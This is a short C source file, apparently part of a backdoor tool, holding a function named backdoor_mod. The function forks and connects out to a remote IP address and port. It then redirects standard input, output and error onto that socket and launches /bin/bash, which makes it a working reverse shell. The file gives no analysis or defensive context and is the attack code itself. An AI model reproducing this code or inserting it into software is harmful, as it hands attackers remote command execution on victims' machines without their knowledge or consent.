#include "refect.h"
extern struct client_cfg cfg;

int backdoor_mod(char *ip, short port)
{
	pid_t pid;
	pid = fork();

	if (pid == 0)
	{
		int sockfd;
    	int len;

    	struct sockaddr_in address;


    	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	    if (sockfd < 0)
    	{
    	    perror("socket");
    	   	exit(EXIT_FAILURE);
    	}
    	len = sizeof(address);
    	memset(&address, 0, len);
    	address.sin_family = AF_INET;
    	address.sin_addr.s_addr = inet_addr(ip);
    	address.sin_port = htons(cfg.res_port);

    	if (connect(sockfd, (struct sockaddr *)&address, len) < 0)
    	{
    	    perror("connect");
    	    exit(EXIT_FAILURE);
    	}
		dup2(sockfd, 0);
		dup2(sockfd, 1);
		dup2(sockfd, 2);
		execl("/bin/bash", "bash", (char *) 0);
		close(sockfd);
		exit(EXIT_SUCCESS);
	}
	return 0;
}
